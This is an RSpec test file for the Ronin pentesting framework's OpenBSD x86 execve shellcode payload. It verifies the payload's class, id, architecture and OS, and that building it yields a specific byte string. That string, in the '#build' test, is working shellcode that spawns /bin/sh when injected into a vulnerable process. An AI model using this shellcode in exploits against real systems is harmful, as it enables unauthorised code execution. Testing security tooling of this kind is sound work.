require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/openbsd/x86/execve'

describe Ronin::Payloads::Shellcode::OpenBSD::X86::Execve do
  it "must inherit from Ronin::Payloads::ShellcodePayload" do
    expect(described_class).to be < Ronin::Payloads::ShellcodePayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/openbsd/x86/execve'" do
      expect(subject.id).to eq('shellcode/openbsd/x86/execve')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86" do
      expect(subject.arch).to be(:x86)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :openbsd" do
      expect(subject.os).to be(:openbsd)
    end
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x54\x53\x53\x6a\x3b\x58\xcd\x80".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
